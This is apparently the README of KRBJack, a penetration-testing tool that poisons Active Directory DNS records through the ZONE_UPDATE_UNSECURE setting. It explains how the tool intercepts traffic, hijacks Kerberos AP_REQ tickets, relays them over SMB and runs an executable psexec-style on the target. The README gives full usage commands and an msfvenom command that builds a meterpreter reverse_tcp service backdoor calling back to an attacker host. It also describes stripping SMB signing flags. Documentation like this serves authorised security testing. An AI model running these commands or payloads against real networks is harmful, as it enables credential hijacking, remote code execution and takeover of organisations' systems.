# KRBJack

This tool can be used to abuse the dangerous `ZONE_UPDATE_UNSECURE` flag on DNS main domain zone in an Active Directory. This flag when set allows anyone unauthenticated to update, add and remove DNS records anonymously. It is quite common to see it during engagements as it is required to get some DHCP servers working with non-windows based systems, to get them update their own records. Even though this flag is extremely dangerous, I've never seen any tool to ease its exploitation. What I wanted to build is a mean to perform Man-in-the-Middle based on this dangerous flag, grab credentials and use them directly to own systems or the entire active directory services (though multiple tools can be used together to perform ntlm relay for example).

The benefit from using this technique of man in the middle is that it goes through routers, as the "official" DNS records are poisonned. If proper routing is set (and if no firewall rule prevents it), someone on another broadcast domain can be targeted (unlike ARP poisoning which only works on you broadcast domain).

Moreover I made the choice to perform fully functionnal AP_REQ hijacking to allow compromission of systems using kerberos instead of NetNTLM.

# Install

```bash
sudo python -m pip install krbjack
```

You do need to install the tool with root rights as it will need to be runnable by root to listen to privileged ports. Alternatively you can have fun with virtual envs. Alternatively you can download this repo and use `poetry` to install it.

# Usage

`sudo krbjack --target-name <targetNBTName> [--target-ip <targetIP>] --domain <domainName> --dc-ip <domainControlerIpAddress> --ports <port1,port2,port3,...> --executable <executable.exe>`

- `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
- `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
- `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
- `--ports` : A list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
- `--executable <executable.exe>` : The path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.

    The executable you provide can be either a "standard" executable, or a windows service executable (better). If it is a "standard" executable, windows will kill it when running after a few seconds if it has not ended already, because as it is run as a service, Windows expects it to do proper signaling (behave as a true service). Though it still works, you might want to migrate quickly your meterpreter when the session is established.

    If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:

        msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y

**Additionnal flags :**

- `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
- `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.

## What are the requirements for this to work ?

First you need to check if the domain you are testing is vulnerable to the main misconfiguration : `ZONE_UPDATE_UNSECURE`. For this you can use external tools such as PingCastle, or let Krbjack do it with the addition of the `--check` flag on the command line.

At the moment this tool only works for systems that do not require SMB Signing. This is a current limitation as the exploited service is SMB for the time being. It means that you cannot target domain controllers most of the time as they have been requiring SMB signing by default for a long time.

## What are the risks of using this tool ?

Just like any other man in the middle attack, you will be receiving connections from any client requesting an access to any service of your target. This means that it can be CPU intensive if the targetted system is highly used.

Moreover, this tool performs live packet inspection on fully-connected TCP streams. Clients DO connect to you before being redirected to the legitimate service. Because of how Kerberos works, it will block some specific connections from behaving correctly as service tickets will be used on the clients' behalf, having the effect to be "consumed" (kerberos tickets cannot be replayed). It means that this tool will make network connection a bit unreliable for every new connection with an interesting AP_REQ in it (AP_REQ for SMB services to our target). HOWEVER, a whitelist is in place to prevent complete blocking of connections. If a client comes several times, only the first AP_REQ will be hijacked. Either it was successful and you pwned your target, or it was not and the client is added to the whitelist to prevent it from being checked again and blocked multiple times. Moreover, other services will still be served and be working correctly thanks to proper forwarding "à la" ssh port forwarding, thoug it might induce lag and delays because of network packets processing on the attacker machine.

## How does it works ?

First the man in the middle is put in place by changing DNS records attached to your target. It abuses the DNS misconfiguration to say `"hey, now myLegitService is now at <attacker's IP>"`. This way, everyone trying to reach the legitimate service will now reach to you instead. The DNS records are also kept poisoned by checking regularly if they have been set back to the right ones (a server or computer might have reboot, or updated a record while the attack was beeing performed).

In the meantime, the tool starts multithreaded TCP servers to mimick your target TCP services. It starts to serve SMB, HTTP, whatever service you state in the command line. It does so just like an SSH port forwarding : when you reach to the attacker's started services, krbjack initiates connection to the true legitimate service on the same port, and forwards every packet from the legitimate client, to the legitimate service. This way, a full man in the middle is performed both ways, this prevents traffic from being completely blocked.

When the man in the middle is performed, every single packet is inspected to find kerberos AP_REQ packets (containing what's necessary to authenticate to services) or other authenticating packets. When such a packet/ticket is found to be sent from a client, it is used in real time to connect to the legitimate service *on behalf* of the legitimate client. This way krbjack can perform authenticated stuff to the legitimate service. At the moment only SMB is supported, meaning that krbjack performs authenticated SMB actions at this time of the attack workflow. It then uses this authenticated channel to check if the legitimate client was an administrator (tries to list directory ADMIN$ - C:\Windows). If it happens that the client was an administrator, man in the middle is stopped, DNS records are fixed ant it then uses the very same authenticated channel to perform a full psexec.

Krbjack also modifies packets on-the-fly depending on the protocol to remove security flags when possible (SMB flags "signing required", "supported" etc... though it is quite naive for the time being).

# Acknowledgements

Project Zero :
- https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
- https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html

Impacket :
- https://github.com/fortra/impacket

# Disclaimer

This tooling is made only for legal penetration testing and not for any other use. I am not responsible for how it is used by anyone or if it is used to penetrate systems without permission or proper contractual agreements. It is provided as is and without warranty of any sort.